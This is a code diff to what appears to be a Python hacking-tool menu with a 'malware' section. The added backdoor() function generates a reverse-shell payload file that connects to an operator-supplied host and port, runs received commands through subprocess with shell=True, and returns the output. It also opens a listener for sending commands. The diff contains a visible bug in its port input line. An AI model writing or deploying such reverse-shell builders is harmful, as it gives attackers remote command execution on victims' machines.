@@ -17,7 +17,7 @@ reset = Fore.RESET
 # Update Config
 VersionKey = 'https://raw.githubusercontent.com/Discordmodsbers/Zion/main/ServerKey.py'
 
-version = '3.1'
+version = '1.1'
 # End
 
 # Update 
@@ -100,9 +100,59 @@ def menu():
       sys.exit('coming soon !')
     elif option =='3':
       update()
+    else:
+      clear()
+      print(Colorate.Horizontal(Colors.yellow_to_red, banner, 1))
 
 def malware():
   print(Colorate.Horizontal(Colors.yellow_to_red, bannerMALWARE, 1))
+  while True:
+    option = input("=> ")
+    if option =='1':
+      backdoor()
+    elif option =='99':
+      transition()
+      menu()
+    else:
+      clear()
+      print(Colorate.Horizontal(Colors.yellow_to_red, bannerMALWARE, 1))
+      
+
+def backdoor():
+  name = input("Please enter Name => ")
+  target = input("Please enter Host ==> ")
+  port = input(int("Please enter Port ===> "))
+  server = socket.socket()
+  server.bind((target, port))
+  with open(f'{name}.py', 'w') as f:
+    f.write(f"""import socket
+import subprocess
+REMOTE_HOST = '{target}' # '192.168.43.82'
+REMOTE_PORT = {port} # 2222
+client = socket.socket()
+print("[-] Connection Initiating...")
+client.connect((REMOTE_HOST, REMOTE_PORT))
+print("[-] Connection initiated!")
+while True:
+    print("[-] Awaiting commands...")
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    print("[-] Sending response...")
+    client.send(output + output_error)""")
+    f.close()
+  server.listen(1)
+  client, client_addr = server.accept()
+  while True:
+    cmd = input("Enter Command: ")
+    cmd = cmd.encode()
+    client.send(cmd)
+    print('[+] Command Sent [+]')
+    output = client.recv(1024)
+    output = output.decode()
+    print(f"[+] {output} [+]")
 
 def Spinner():
 	l = ['|', '/', '-', '\\']
